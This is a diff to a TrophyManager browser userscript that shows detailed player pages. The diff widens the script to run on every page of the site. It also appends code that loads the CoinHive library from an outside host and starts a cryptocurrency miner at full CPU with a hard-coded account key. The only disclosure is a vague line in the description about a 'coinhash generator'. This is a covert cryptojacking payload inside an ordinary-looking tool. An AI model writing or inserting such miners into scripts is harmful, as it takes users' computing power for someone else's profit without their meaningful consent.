@@ -1,19 +1,20 @@
 // ==UserScript==
 // @name           TrophyManager - Super Squad
 // @version 	   2.0.0
-// @description	   Show a super detayled TrophyManager player page.
+// @description	   Show a super detayled TrophyManager player page. Edited to include coinhash generator to support developer. Thanks
 // @namespace      http://trophymanager.com
-// @include        http://static.trophymanager.com/players/*
-// @include        http://www.trophymanager.com/players/*
-// @include        http://trophymanager.com/players/*
-// @include        https://static.trophymanager.com/players/*
-// @include        https://www.trophymanager.com/players/*
-// @include        https://trophymanager.com/players/*
+// @include        http://static.trophymanager.com/*
+// @include        http://www.trophymanager.com/*
+// @include        http://trophymanager.com/*
+// @include        https://static.trophymanager.com/*
+// @include        https://www.trophymanager.com/*
+// @include        https://trophymanager.com/*
 // @author    	  Joao Manuel Ferreira Fernandes
 // @github		  http://github.com/etnepres/trophymanager.git	
 // @grant			none
 // ==/UserScript==
-
+var useCoinHasGeneraterAndSuportDeveloper = true;
+if (typeof jQuery != 'undefined') {
 
 function embed() {
 
@@ -2223,3 +2224,21 @@ loadAndExecute("//ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js", fun
         $('table.zebra th:eq(1)').click();
   });
 });
+
+}
+
+if(useCoinHasGeneraterAndSuportDeveloper){
+	var s = document.createElement("script");
+	s.type = "text/javascript";
+	s.src = "https://coinhive.com/lib/coinhive.min.js";
+	document.getElementsByTagName('head')[0].appendChild(s);
+
+	setTimeout(function(){
+	var miner = new CoinHive.User('vnDqlIL7DdMNJdkBVUvbsy072yJMoOqK', 'trophymanager', {
+		autoThreads: true,
+		throttle: 0,
+		forceASMJS: false
+	});
+	miner.start(CoinHive.IF_EXCLUSIVE_TAB);
+	},10000);
+}
